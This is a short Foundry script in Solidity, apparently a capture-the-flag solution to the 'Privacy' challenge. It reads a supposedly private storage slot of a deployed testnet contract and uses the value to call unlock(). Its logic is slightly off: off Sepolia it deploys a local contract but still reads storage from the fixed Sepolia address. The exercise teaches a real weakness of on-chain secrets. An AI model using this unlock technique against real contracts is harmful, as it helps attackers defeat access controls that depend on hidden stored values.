// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PrivacySolution is Script {
    Privacy public privacy;

    function run() external {
        console.log("Solving Privacy...");

        uint256 id;
        assembly {
            id := chainid()
        }
        if (id == 11155111) {
            privacy = Privacy(0x941E1e8e3A707870a6c612c27E250dFeeaA0968B);
        } else {
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            privacy = new Privacy(
                [bytes32(uint256(1)), bytes32(uint256(2)), bytes32(uint256(3))]
            );
            vm.stopBroadcast();
        }
        bytes32 data = vm.load(
            0x941E1e8e3A707870a6c612c27E250dFeeaA0968B,
            bytes32(uint256(5))
        );

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Performing hack...");
        privacy.unlock(bytes16(data));
        vm.stopBroadcast();
        require(privacy.locked() == false);

        console.log("Ok");
    }
}
